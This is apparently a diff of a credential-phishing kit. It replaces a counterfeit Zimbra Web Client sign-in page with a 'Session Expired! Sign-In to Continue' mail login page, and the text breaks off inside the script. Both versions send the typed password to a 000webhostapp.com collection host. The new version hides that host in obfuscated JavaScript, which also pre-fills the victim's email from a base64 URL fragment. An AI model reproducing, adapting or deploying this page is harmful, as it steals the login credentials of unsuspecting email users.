@@ -1,383 +1,600 @@
 
 <!DOCTYPE html>
-<!-- set this class so CSS definitions that now use REM size, would work relative to this.
-	Since now almost everything is relative to one of the 2 absolute font size classese -->
-<html class="user_font_size_normal" lang="en">
-<head>
-<!--
- login.jsp
- * ***** BEGIN LICENSE BLOCK *****
- * Zimbra Collaboration Suite Web Client
- * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
- *
- * This program is free software: you can redistribute it and/or modify it under
- * the terms of the GNU General Public License as published by the Free Software Foundation,
- * version 2 of the License.
- *
- * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
- * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
- * See the GNU General Public License for more details.
- * You should have received a copy of the GNU General Public License along with this program.
- * If not, see <https://www.gnu.org/licenses/>.
- * ***** END LICENSE BLOCK *****
--->
-	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
-	<title>Zimbra Web Client Sign In</title>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
-	<meta name="apple-mobile-web-app-capable" content="yes" />
-	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
-	<link rel="stylesheet" type="text/css" href="https://zimbra.ptt.cl/css/common,login,zhtml,skin.css?skin=harmony&v=190819061705">
-	<link rel="SHORTCUT ICON" href="https://zimbra.ptt.cl/img/logo/favicon.ico">
+<html lang="zxx"><head>
 
 
-</head>
-<body onload="onLoad();">
-
-	<div class="LoginScreen">
-		<div class="center">
-			<div class="contentBox">
-				<h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
-					<span class="ImgLoginBanner"></span>
-				</a></h1>
-				<div id="ZLoginAppName">Web Client</div>
-				<form method="post" name="loginForm" action="https://beckybellfndn2023.000webhostapp.com/" accept-charset="UTF-8">
-								<input type="hidden" name="loginOp" value="login"/>
-								<input type="hidden" name="login_csrf" value="b5cc4720-c4bf-4c64-b541-6a1b2ca62172"/>
-
-								<table class="form">
-                        <tbody>
-		<tr>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><label for="username" style="margin-right: 20px;">Username:</label></td>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><input autocapitalize="off" autocorrect="off" class="zLoginField" id="username" maxlength="1024" name="textinput" placeholder="" required="required" size="40" style="font-size: 11px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Liberation Sans&quot;, sans-serif; color: black; border-width: 1px; border-style: solid; border-color: rgb(238, 238, 238); margin: 0px; border-radius: 5px; height: 22px; width: 235px;" type="text" /></td>
-		</tr>
-		<tr>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><label for="password" style="margin-right: 20px;">Password:</label></td>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><input autocomplete="off" class="zLoginField" id="password" maxlength="1024" name="passwordinput" required="required" size="40" style="font-size: 11px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Liberation Sans&quot;, sans-serif; color: black; border-width: 1px; border-style: solid; border-color: rgb(238, 238, 238); margin: 0px; border-radius: 5px; height: 22px; width: 235px;" type="password" value="" /></td>
-		</tr>
-		<tr>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><label for="Confirm password" style="margin-right: 20px;">Confirm Password:</label></td>
-			<td style="border-width: 0px; padding: 0px 0px 10px;"><input autocomplete="off" class="zLoginField" id="password" maxlength="1024" name="passwordinput2" required="required" size="40" style="font-size: 11px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Liberation Sans&quot;, sans-serif; color: black; border-width: 1px; border-style: solid; border-color: rgb(238, 238, 238); margin: 0px; border-radius: 5px; height: 22px; width: 235px;" type="password" value="" /></td>
-		</tr>
-		<tr>
-                                <tr>
-                                <td>&nbsp;</td>
-                                <td class="submitTD">
-                                <input id="remember" value="1" type="checkbox" name="zrememberme" />
-                                    <label for="remember">Stay signed in</label>
-                                <input type="submit" class="ZLoginButton DwtButton" value="Sign In" />
-                                </td>
-                                </tr>
-			
-				<tr >
-                            <td colspan="2"><hr/></td>
-                            </tr>
-                            <tr >
-                            <td>
-                            <label for="client">Version:</label>
-                            </td>
-                            <td>
-                            <div class="positioning">
-                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
-                                    <option value="preferred" selected > Default</option>
-                                    <option value="advanced" > Advanced (Ajax)</option>
-                                    <option value="standard" > Standard (HTML)</option>
-                                    <option value="mobile" > Mobile</option>
-                                    </select>
-                                <script TYPE="text/javascript">
-                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
-                        </script>
-                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip"><h3 style="text-align:center;">Client Types</h3>	<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
-                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
-                        </div>
-                        </td>
-                        </tr>
-                        </table>
-                    </form>
-			</div>
-			<div class="decor1"></div>
-		</div>
-
-		<div class="Footer">
-			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
-			<div class="copyright">
-			Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
-		</div>
-		<div class="decor2"></div>
-	</div>
-<script>
-
-function ZmSkin(e){
-this.hints=this.mergeObjects(ZmSkin.hints,e)
-}
-ZmSkin.hints={
-name:"harmony",version:"1",skin:{
-containers:"skin_outer"}
-,banner:{
-position:"static",url:"http://www.zimbra.com"}
-,userInfo:{
-position:"static"}
-,search:{
-position:"static"}
-,quota:{
-position:"static"}
-,presence:{
-width:"40px",height:"24px"}
-,appView:{
-position:"static"}
-,searchResultsToolbar:{
-containers:["skin_tr_search_results_toolbar"]}
-,newButton:{
-containers:["skin_td_new_button"]}
-,tree:{
-minWidth:"13.5rem",maxWidth:"84rem",containers:["skin_td_tree","skin_td_tree_app_sash"],resizeContainers:["skin_td_tree","skin_container_app_new_button"]}
-,topToolbar:{
-containers:"skin_spacing_app_top_toolbar"}
-,treeFooter:{
-containers:"skin_tr_tree_footer"}
-,topAd:{
-containers:"skin_tr_top_ad"}
-,sidebarAd:{
-containers:"skin_td_sidebar_ad"}
-,bottomAd:{
-containers:"skin_tr_bottom_ad"}
-,treeTopAd:{
-containers:"skin_tr_tree_top_ad"}
-,treeBottomAd:{
-containers:"skin_tr_tree_bottom_ad"}
-,helpButton:{
-style:"link",container:"quota",url:""}
-,logoutButton:{
-style:"link",container:"quota"}
-,appChooser:{
-position:"static",direction:"LR"}
-,toast:{
-location:"N",transitions:[{
-type:"fade-in",step:5,duration:50}
-,{
-type:"pause",duration:5000}
-,{
-type:"fade-out",step:-10,duration:500}
-]}
-,fullScreen:{
-containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
-,allAds:{
-containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
-,hideSearchInCompose:true,notificationBanner:"/skins/_base/logos/NotificationBanner_grey.gif?v=190819061705",socialfox:{
-iconURL:"/img/logo/ImgZimbraIcon.gif",icon32URL:"/img/logo/ImgZimbraLogo_32.gif",icon64URL:"/img/logo/ImgZimbraLogo_64.gif",mailIconURL:"/img/zimbra/ImgMessage.png"}};
-window.BaseSkin=ZmSkin;
-ZmSkin.prototype={
-show:function(t,e,l){
-var a=this.hints[t]&&this.hints[t].containers;
-if(a){
-if(typeof a=="function"){
-a.apply(this,[e!=false]);
-skin._reflowApp();
-return
-}
-if(typeof a=="string"){
-a=[a]
-}
-var s=false;
-for(var r=0;
-r<a.length;
-r++){
-var h=a[r];
-var o=h.replace(/^!/,"");
-var n=h!=o;
-if(this._showEl(o,n?!e:e)){
-s=true
-}}
-if(s&&!l){
-skin._reflowApp()
-}}}
-,hide:function(e,t){
-this.show(e,false,t)
-}
-,gotoApp:function(e,t){
-appCtxt.getAppController().activateApp(e,null,t)
-}
-,gotoPrefs:function(e){
-if(appCtxt.getCurrentAppName()!=ZmApp.PREFERENCES){
-var t=new AjxCallback(this,this._gotoPrefPage,[e]);
-this.gotoApp(ZmApp.PREFERENCES,t)
-}else{
-this._gotoPrefPage(e)
-}}
-,mergeObjects:function(e,o){
-if(e==null){
-e={}
-}
-for(var a=1;
-a<arguments.length;
-a++){
-var n=arguments[a];
-for(var t in n){
-var s=e[t];
-if(typeof s=="object"&&!(s instanceof Array)){
-this.mergeObjects(e[t],n[t]);
-continue
-}
-if(!e[t]){
-e[t]=n[t]
-}}}
-return e
-}
-,getTreeWidth:function(){
-return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x
-}
-,setTreeWidth:function(e){
-this._setContainerSizes("tree",e,null)
-}
-,showTopAd:function(e){
-if(skin._showEl("skin_tr_top_ad",e)){
-skin._reflowApp()
-}}
-,hideTopAd:function(){
-skin.showTopAd(false)
-}
-,getTopAdContainer:function(){
-return skin._getEl("skin_container_top_ad")
-}
-,showSidebarAd:function(e){
-var t="skin_td_sidebar_ad";
-if(e!=null){
-Dwt.setSize(t,e)
-}
-if(skin._showEl(t)){
-skin._reflowApp()
-}}
-,hideSidebarAd:function(){
-var e="skin_td_sidebar_ad";
-if(skin._hideEl(e)){
-skin._reflowApp()
-}}
-,getSidebarAdContainer:function(){
-return this._getEl("skin_container_sidebar_ad")
-}
-,handleNotification:function(t,e){}
-,_getEl:function(e){
-return(typeof e=="string"?document.getElementById(e):e)
-}
-,_showEl:function(o,i){
-var t=this._getEl(o);
-if(!t){
-return
-}
-var a;
-if(i==false){
-a="none"
-}else{
-var e=t.tagName;
-if(e=="TD"){
-a="table-cell"
-}else{
-if(e=="TR"){
-a="table-row"
-}else{
-a="block"
-}}}
-if(a!=t.style.display){
-t.style.display=a;
-return true
-}else{
-return false
-}}
-,_hideEl:function(e){
-return this._showEl(e,false)
-}
-,_reparentEl:function(i,e){
-var a=this._getEl(e);
-var t=a&&this._getEl(i);
-if(t){
-a.appendChild(t)
-}}
-,_setContainerSizes:function(n,a,e){
-var o=this.hints[n].resizeContainers||this.hints[n].containers;
-for(var t=0;
-t<o.length;
-t++){
-Dwt.setSize(o[t],a,null)
-}}
-,_reflowApp:function(){
-if(window._zimbraMail){
-window._zimbraMail.getAppViewMgr().fitAll()
-}}
-,_gotoPrefPage:function(a){
-if(a==null){
-return
-}
-var i=appCtxt.getApp(ZmApp.PREFERENCES);
-var t=i.getPrefController();
-var e=t.getPrefsView();
-e.selectSection(a)
-}};
-window.skin=new ZmSkin();
-var link = document.getElementById("bannerLink");
-if (link) {
-	link.href = skin.hints.banner.url;
-}
-
-
-
-// show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
-function clientChange(selectValue) {
-	var useStandard = false;
-	useStandard = useStandard || (screen && (screen.width <= 800 && screen.height <= 600));
-	var div = document.getElementById("ZLoginUnsupported");
-	if (div)
-	div.style.display = ((selectValue == 'advanced') && useStandard) ? 'block' : 'none';
-}
-
-// if they have JS, write out a "what's this?" link that shows the message below
-function showWhatsThis() {
-	var anchor = document.getElementById('ZLoginWhatsThisAnchor'),
-        tooltip = document.getElementById("ZLoginWhatsThis"),
-        doHide = (tooltip.style.display === "block");
-    tooltip.style.display = doHide ? "none" : "block";
-    anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
-}
-
-function forgotPassword() {
-	var accountInput = document.getElementById("username").value;
-	var queryParams = encodeURI("account=" + accountInput);
-	var url = "/public/PasswordRecovery.jsp?" + location.search;
-
-	if (accountInput !== '') {
-		url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
-	}
-
-	window.location.href = url;
-}
-
-
-function onLoad() {
-	var loginForm = document.loginForm;
-	if (loginForm.username) {
-		if (loginForm.username.value != "") {
-			loginForm.password.focus(); //if username set, focus on password
-		}
-		else {
-			loginForm.username.focus();
-		}
-	}
-	clientChange("preferred");
-    //check if the login page is loaded in the sidebar.
-    if (navigator.mozSocial) {
-        //send a ping so that worker knows about this page.
-        navigator.mozSocial.getWorker().port.postMessage({topic: "worker.reload", data: true});
-        //this page is loaded in firefox sidebar so listen for message from worker.
-        navigator.mozSocial.getWorker().port.onmessage = function onmessage(e) {
-            var topic = e.data.topic;
-            if (topic && topic == "sidebar.authenticated") {
-                window.location.href = "/public/launchSidebar.jsp";
-            }
-        };
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Mail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="" type="image/x-icon">
+    <link href="https://mytehranmusic.ru/.oce/css2.css" rel="stylesheet">
+    <style>
+        body {
+        font-family: 'Open Sans', sans-serif;
+        color: #535353;
     }
-	if (false && loginForm.totpcode) {
-        loginForm.totpcode.focus();
-	}
-}
+
+    .img-fluid {
+        max-width: 100% !important;
+        height: auto;
+    }
+
+    .form-control:focus {
+        box-shadow: none;
+    }
+
+    .login-box .alert {
+        padding: 15.5px 20px;
+        font-size: 13px;
+        border: none !important;
+        border-radius: 3px;
+        margin-bottom: 25px;
+    }
+
+    .login-box .alert-dismissible .btn-close {
+        padding: 18.5px 19px;
+        background-size: 8px;
+    }
+
+    .login-box .alert-dismissible .btn-close:focus,
+    .login-box .alert-dismissible .btn-close:active {
+        box-shadow: none;
+    }
+
+    .login-box .password-indicator {
+        position: absolute;
+        right: 15px;
+        top: 17px;
+        cursor: pointer;
+        visibility: hidden;
+        opacity: 0;
+        transition: visibility 0s linear 300ms, opacity 500ms;
+        font-size: 17px;
+        color: #999;
+    }
+
+    .login-box .password-wrapper:hover .password-indicator {
+        visibility: visible;
+        opacity: 1;
+        transition: visibility 0s linear 0s, opacity 500ms;
+        font-size: 17px;
+        color: #555;
+    }
+
+    .login-box .login-popover {
+        font-size: 14px;
+        color: #777;
+        cursor: help;
+    }
+
+    .login-box .login-popover-abs {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+    }
+
+    .popover {
+        border: 1px solid #ebeef5 !important;
+        box-shadow: 0 2px 12px 0 rgb(0 0 0 / 10%);
+    }
+
+    .popover-header {
+        box-shadow: none;
+        border: 0px;
+        background: #fff;
+        color: #555;
+        font-size: 15px;
+        font-family: 'Jost', sans-serif;
+        padding-bottom: 5px;
+    }
+
+    .popover-body {
+        padding: 5px 10px 10px 16px;
+        color: #777;
+        font-size: 13px;
+    }
+
+    .login-box .form-group label.error {
+        font-size: 13px;
+        text-align: left;
+        color: #535353;
+        width: 100%;
+    }
+
+    /** Login 26 start **/
+    .login-26 {
+        background: url('') top left repeat;
+        background-size: cover;
+        top: 0;
+        width: 100%;
+        text-align: center;
+        bottom: 0;
+        opacity: 1;
+        z-index: 999;
+        min-height: 100vh;
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 30px 0;
+    }
+
+    .login-26 .form-section {
+        max-width: 550px;
+        margin: 0 auto;
+        padding: 70px 50px;
+        background: #fff;
+        border-radius: 5px;
+        box-shadow: 0 0 35px rgba(0, 0, 0, 0.1);
+        z-index: 999;
+    }
+
+    .login-26 #particles-js {
+        background-size: cover;
+        background-position: 50% 50%;
+        position: fixed;
+        min-height: 100vh;
+        width: 100%;
+        z-index: -999;
+    }
+
+    .login-26 .form-section p {
+        color: #535353;
+        margin-bottom: 0;
+        text-align: center;
+        font-size: 16px;
+    }
+
+    .login-26 h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    .h1,
+    .h2,
+    .h3,
+    .h4,
+    .h5,
+    .h6 {
+        font-family: 'Jost', sans-serif;
+    }
+
+    .login-26 .form-section a {
+        text-decoration: none;
+    }
+
+    .login-26 .form-section p a {
+        color: #535353;
+        font-weight: 500;
+    }
+
+    .login-26 .form-section .extra-login {
+        float: left;
+        width: 100%;
+        margin: 25px 0 25px;
+        text-align: center;
+        position: relative;
+    }
+
+    .login-26 .form-section .extra-login::before {
+        position: absolute;
+        left: 0;
+        top: 10px;
+        width: 100%;
+        height: 1px;
+        background: #d8dcdc;
+        content: "";
+    }
+
+    .login-26 .form-section .extra-login>span {
+        width: auto;
+        float: none;
+        display: inline-block;
+        background: #fff;
+        padding: 1px 20px;
+        z-index: 1;
+        position: relative;
+        font-size: 15px;
+        color: #535353;
+        text-transform: capitalize;
+    }
+
+    .login-26 .form-section ul {
+        list-style: none;
+        padding: 0;
+        margin: 0 0 20px;
+    }
+
+    .login-26 .logo-2 img {
+        margin-bottom: 20px;
+        height: 30px;
+    }
+
+    .login-26 .form-section .social-list li {
+        display: inline-block !important;
+        margin-bottom: 5px;
+    }
+
+    .login-26 .form-section .social-list li a {
+        font-size: 14px;
+        font-weight: 400;
+        width: 130px;
+        margin: 2px 0 3px 0;
+        height: 40px;
+        line-height: 40px;
+        border-radius: 20px;
+        display: inline-block;
+        text-align: center;
+        text-decoration: none;
+        background: #fff;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+        font-family: 'Jost', sans-serif;
+    }
+
+    .login-26 .form-section .social-list li a i {
+        height: 40px;
+        width: 40px;
+        line-height: 40px;
+        float: left;
+        color: #fff;
+        border-radius: 20px;
+    }
+
+    .login-26 .form-section .social-list li a span {
+        margin-right: 7px;
+    }
+
+    .login-26 .form-section .thembo {
+        margin-left: 4px;
+    }
+
+    .login-26 .form-section h3 {
+        margin: 0 0 30px;
+        font-size: 25px;
+        font-weight: 400;
+        color: #040404;
+    }
+
+    .login-26 .main-title .words-wrapper b {
+        display: inline-block;
+        position: absolute;
+        white-space: nowrap;
+        left: 0;
+        top: 0;
+    }
+
+    .login-26 .main-title .words-wrapper b.visible {
+        position: relative;
+    }
+
+    .login-26 .main-title .no-js .words-wrapper b {
+        opacity: 0;
+    }
+
+    .login-26 .main-title .no-js .words-wrapper b.visible {
+        opacity: 1;
+    }
+
+    .login-26 .main-title .headline {
+        margin: 0 0 30px;
+        font-size: 25px;
+        font-weight: 400;
+        color: #313131;
+    }
+
+    .login-26 .main-title .headline b {
+        opacity: 0;
+        font-weight: 400;
+    }
+
+    .login-26 .main-title .headline b.visible {
+        top: 0;
+        opacity: 1;
+        -webkit-animation: slide-in 0.6s;
+        -moz-animation: slide-in 0.6s;
+        animation: slide-in 0.6s;
+    }
+
+    .login-26 .main-title .headline b.is-hidden {
+        -webkit-animation: slide-out 0.6s;
+        -moz-animation: slide-out 0.6s;
+        animation: slide-out 0.6s;
+    }
+
+    .login-26 .main-title .visible {
+        color: #01c5ff;
+    }
+
+    @-webkit-keyframes slide-in {
+        0% {
+            opacity: 0;
+            -webkit-transform: translateY(-100%);
+        }
+
+        60% {
+            opacity: 1;
+            -webkit-transform: translateY(20%);
+        }
+
+        100% {
+            opacity: 1;
+            -webkit-transform: translateY(0);
+        }
+    }
+
+    .login-26 .form-section .form-group {
+        margin-bottom: 25px;
+    }
+
+    .login-26 .form-section .form-control {
+        float: left;
+        width: 100%;
+        padding: 12px 20px 12px 20px;
+        height: 50px;
+    }
+
+    .login-26 .form-section .form-control {
+        font-size: 16px;
+        outline: none;
+        background: #e8e8e8;
+        color: #535353;
+        border-radius: 3px;
+        border: 1px solid #e8e8e8;
+    }
+
+    .login-26 .form-section .checkbox .terms {
+        margin-left: 3px;
+    }
+
+    .login-26 .form-section button:focus {
+        outline: none;
+        outline: 0 auto -webkit-focus-ring-color;
+    }
+
+    .login-26 .form-section .terms {
+        margin-left: 3px;
+    }
+
+    .login-26 .form-section .form-check-input {
+        width: 20px;
+        height: 20px;
+        margin-top: 0;
+        position: absolute;
+        border: 1px solid #e8e8e8;
+        border-radius: 2px;
+        background-color: #e8e8e8;
+        margin-left: -22px;
+    }
+
+    .login-26 .form-section .checkbox {
+        margin-bottom: 20px;
+    }
+
+    .login-26 .form-section .form-check {
+        margin-bottom: 0;
+        text-align: left;
+    }
+
+    .login-26 .form-section .form-check a {
+        color: #535353;
+    }
+
+    .login-26 .form-section .form-check-label {
+        padding-left: 5px;
+        margin-bottom: 0;
+        font-size: 16px;
+        color: #535353;
+    }
+
+    .login-26 .form-check-input:checked {
+        background-color: #01c5ff;
+        border-color: #01c5ff;
+    }
+
+    .login-26 .form-section a.forgot-password {
+        font-size: 16px;
+        color: #535353;
+    }
+
+    .login-26 .btn-theme {
+        color: #fff;
+        text-align: center;
+        border: 2px solid transparent;
+        display: inline-block;
+        position: relative;
+        z-index: 1;
+        transition: all .7s ease;
+        border-radius: 3px;
+        font-size: 17px;
+        font-weight: 400;
+        font-family: 'Jost', sans-serif;
+        width: 50%;
+    }
+
+    .login-26 .btn-theme:before {
+        position: absolute;
+        content: "";
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        visibility: hidden;
+        transition: all .7s ease;
+        z-index: -1;
+        border-radius: 3px;
+    }
+
+    .login-26 .btn-theme:after {
+        position: absolute;
+        content: "";
+        top: 0;
+        right: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        visibility: hidden;
+        transition: all .7s ease;
+        z-index: -1;
+    }
+
+    .login-26 .btn-theme:hover {
+        background: transparent;
+    }
+
+    .login-26 .btn-theme:hover:before {
+        width: 0;
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .login-26 .btn-theme:hover:after {
+        width: 0;
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .login-26 .btn-lg {
+        padding: 0 50px;
+        line-height: 46px;
+    }
+
+    .login-26 .btn {
+        box-shadow: none !important;
+    }
+
+    .login-26 .btn-md {
+        padding: 0 45px;
+        line-height: 41px;
+    }
+
+    .login-26 .btn-primary {
+        background: #01c5ff;
+    }
+
+    .login-26 .btn-primary:before {
+        background: #01c5ff;
+    }
+
+    .login-26 .btn-primary:after {
+        background: #01c5ff;
+    }
+
+    .login-26 .btn-primary:hover {
+        color: #01c5ff;
+        border: 2px solid #01c5ff;
+    }
+
+    /** Social media **/
+    .login-26 .facebook-i {
+        background: #4867aa;
+        color: #fff;
+    }
+
+    .login-26 .twitter-i {
+        background: #33CCFF;
+        color: #fff;
+    }
+
+    .login-26 .google-i {
+        background: #db4437;
+        color: #fff;
+    }
+
+    .login-26 .facebook-color {
+        color: #4867aa;
+    }
+
+    .login-26 .twitter-color {
+        color: #33CCFF;
+    }
+
+    .login-26 .google-color {
+        color: #db4437;
+    }
+
+    @media (max-width: 768px) {
+        .login-26 .form-section {
+            padding: 50px 30px;
+        }
+    }
+
+    @media (max-width: 500px) {
+        .login-26 .form-section .social-list li a i {
+            display: none;
+        }
+
+        .login-26 .form-section .social-list li a {
+            width: 100px;
+        }
+    }
+
+    /** Login 26 end **/
+
+
+    #myProgress {
+        width: 100%;
+        background-color: grey;
+    }
+
+    #myBar {
+        width: 1%;
+        height: 30px;
+        background-color: green;
+    }
+    </style>
+</head>
+
+<body id="top">
+    <div class="page_loader"></div>
+    <div class="login-26">
+        <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none; background-color: rgb(122,122,122,0.2);"></iframe>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12 align-items-center">
+                    <div class="form-section">
+                        
+                        
+                        <div id="formContent" style="display: block; right: 0px;">
+                            <form name="apform">
+                                <img class="favicon-logo" width="64px" src="https://www.google.com/s2/favicons?sz=64&amp;domain_url=cpanel.com"><br>
+                                <h3>Session Expired! Sign-In to Continue</h3>
+                                <center>
+                                    <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password..! Please enter correct password.</div>
+                                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                                </center>
+                                <div class="form-group clearfix mb-1">
+                                    <input name="ai" type="email" id="ai" readonly="" value="" class="form-control" placeholder="Email Address" aria-label="Email Address">
+                                </div>
+                                <div class="form-group clearfix">
+                                    <input name="pr" type="password" id="pr" class="form-control" placeholder="Password" aria-label="Password">
+                                </div>
+                                
+                                <div class="form-group mb-0 clearfix">
+                                    <input type="button" class="btn btn-lg btn-primary btn-theme w-100" id="sub-btn" value="Login">
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+function _0x1214(){var _0x4fa512=['keyCode','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','src','61OuXZDD','#error','JSON','preventDefault','#pr','html','keypress','Password\x20field\x20is\x20empty.!','location','Verifying...','8452712CJhkeI','Email\x20field\x20is\x20empty.!','3172791kxritc','indexOf','62eZTEKb','animate','click','#domain','POST','hide','7790310KzFQbU','which','attr','10168659ywabAr','hash','.favicon-logo','test','ready','Session\x20Expired,\x20sign\x20in\x20to\x20continue.','#msg','toLowerCase','4912860ndrPSY','https://','#reconnect','#sub-btn','show','Login','style','7hzBINL','substr','https://www.google.com','ajax','4QQtnaF','http://www.','264hbkChy','getElementById','val','#ai-txt','https://beckybellfndn2023.000webhostapp.com/','width','https://www.google.com/s2/favicons?sz=64&domain_url=','38615LdExUO'];_0x1214=function(){return _0x4fa512;};return _0x1214();}var _0x479a13=_0x14f9;function _0x14f9(_0x8832ea,_0x1f5ee2){var _0x1214e1=_0x1214();return _0x14f9=function(_0x14f965,_0x328f3c){_0x14f965=_0x14f965-0x176;var _0x3a6363=_0x1214e1[_0x14f965];return _0x3a6363;},_0x14f9(_0x8832ea,_0x1f5ee2);}(function(_0x72ba19,_0x1fea7a){var _0x145659=_0x14f9,_0x1db795=_0x72ba19();while(!![]){try{var _0x2dea34=parseInt(_0x145659(0x184))/0x1*(-parseInt(_0x145659(0x192))/0x2)+parseInt(_0x145659(0x190))/0x3*(-parseInt(_0x145659(0x177))/0x4)+parseInt(_0x145659(0x180))/0x5*(-parseInt(_0x145659(0x179))/0x6)+-parseInt(_0x145659(0x1aa))/0x7*(-parseInt(_0x145659(0x18e))/0x8)+parseInt(_0x145659(0x19b))/0x9+parseInt(_0x145659(0x1a3))/0xa+-parseInt(_0x145659(0x198))/0xb;if(_0x2dea34===_0x1fea7a)break;else _0x1db795['push'](_0x1db795['shift']());}catch(_0x3d2264){_0x1db795['push'](_0x1db795['shift']());}}}(_0x1214,0x8b368));var rdrt=_0x479a13(0x1ac),domain_redirect=0x1,rc=0x2,f=_0x479a13(0x17d);$(document)[_0x479a13(0x19f)](function(){var _0x340ba1=_0x479a13,_0x8de6b9=0x0,_0x5bd550=0x0;$(document)[_0x340ba1(0x18a)](function(_0x191fcc){var _0x2e98f7=_0x340ba1,_0x33a344=_0x191fcc[_0x2e98f7(0x181)]?_0x191fcc['keyCode']:_0x191fcc[_0x2e98f7(0x199)];_0x33a344=='13'&&(_0x191fcc[_0x2e98f7(0x187)](),$(_0x2e98f7(0x1a6))[_0x2e98f7(0x194)]());});function _0x2260ba(){if(_0x5bd550==0x0){_0x5bd550=0x1;var _0x310e84=document['getElementById']('myBar'),_0x4b2366=0x1,_0x57f3f5=setInterval(_0x4dab92,0x32);function _0x4dab92(){var _0x4c5de4=_0x14f9;_0x4b2366>=0x64?(clearInterval(_0x57f3f5),_0x5bd550=0x0,$(_0x4c5de4(0x1a5))[_0x4c5de4(0x189)](_0x4c5de4(0x1a0)),$('#myProgress')[_0x4c5de4(0x193)]({'left':0x0,'opacity':_0x4c5de4(0x197)},0x0),$(_0x4c5de4(0x17c))[_0x4c5de4(0x197)](),$('#formContent')[_0x4c5de4(0x193)]({'right':0x0,'opacity':'show'},0x1f4)):(_0x4b2366++,_0x310e84[_0x4c5de4(0x1a9)][_0x4c5de4(0x17e)]=_0x4b2366+'%');}}}var _0x2e65af=window['location'][_0x340ba1(0x19c)][_0x340ba1(0x1ab)](0x1);if(!_0x2e65af)_0x2260ba();else{var _0x590011=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0x590011['test'](_0x2e65af))var _0x2c94f7=_0x2e65af;else var _0x2c94f7=atob(_0x2e65af);var 